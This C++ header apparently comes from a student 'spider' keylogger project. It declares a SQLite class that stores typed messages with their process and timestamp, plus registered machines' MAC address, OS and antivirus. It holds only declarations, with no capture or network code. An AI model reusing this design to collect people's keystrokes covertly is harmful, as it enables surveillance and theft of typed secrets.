/*
** Sqlite.hpp for cpp_spider in /home/god/TEK3/C++/cpp_spider/includes/Sqlite.hpp
**
** Made by Maxime PILLON
** Login   <maxime.pillon@epitech.eu>
**
** Started on  Tue Sep 26 12:35:06 2017 Maxime PILLON
** Last update Tue Sep 26 12:35:06 2017 Maxime PILLON
*/

#ifndef SQLITE_HPP_
# define SQLITE_HPP_

# include <sqlite3.h>
#include "dataStructure.hpp"
# include "IDatabase.hpp"

/// \namespace spider
namespace spider
{
  /// \class Sqlite
  class Sqlite : public IDatabase
  {
  protected:
    sqlite3		*_db;
    const char*		_data = "Callback function called";

  public:
    /// \brief construct sqlite object
    Sqlite();

    /// \brief Destroy the sqlite object
    ~Sqlite() override;

    /// \brief Execute an Querry to the database
    ///
    /// \param Querry the statement to execute
    void execute(const char *querry) override;

    /// \brief Initialise or create a database.
    ///
    /// \param filename, filename of the db
    /// \return True if the db is created or opened
    bool open(const char *filename) override;

    /// \brief create all the tables if it's needed
    void createDb() override;

    /// \brief drop all the database row
    void dropDb() override;

    /// \brief Close the actual database
    void close() override;

    /// \brief Pushing one entry to the DB
    ///
    /// \param data The entry
    void pushData(t_unserialized data);

    /// \brief Add a row to the database
    ///
    /// \param time timestamp of the action
    /// \param proccess process where the commad has been typed
    /// \param message message which has been typed
    void addEntryLog(const char *time, const char *proccess, const char *message);

    /// \brief Add a row to register table the database
    ///
    /// \param time timestamp of the action
    /// \param proccess process where the commad has been typed
    /// \param message message which has been typed
    void addEntryRegister(const char *mac, const char *os, const char *antivirus);

    /// \brief remove a special row of one of the table
    ///
    /// \param id remove the row where id=id
    void removeEntryRegister(int id);

    /// \brief remove a special row of the db
    ///
    /// \param id remove the row where id=id
    void removeEntryLog(int id) override;

    /// \brief treat an queue to insert it in the db
    ///
    /// \param toTreat the queue
    void treat(unserialized_queue &toTreat) override;
  };
}

#endif // !SQLITE_HPP_
